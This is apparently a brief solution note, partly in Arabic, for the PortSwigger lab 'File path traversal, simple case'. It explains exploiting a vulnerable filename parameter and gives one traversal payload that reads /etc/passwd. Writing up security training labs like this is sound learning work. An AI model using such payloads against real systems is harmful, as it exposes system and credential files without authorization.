# Lab : File path traversal , simple case

https://portswigger.net/web-security/file-path-traversal/lab-simple

- الفكره من الLab ده انك تستغل الparameter المصاب و تخليه يعرض ملفات حساسه ذي etc/passwd

```bash
1. /image?filename=../../../etc/passwd
```
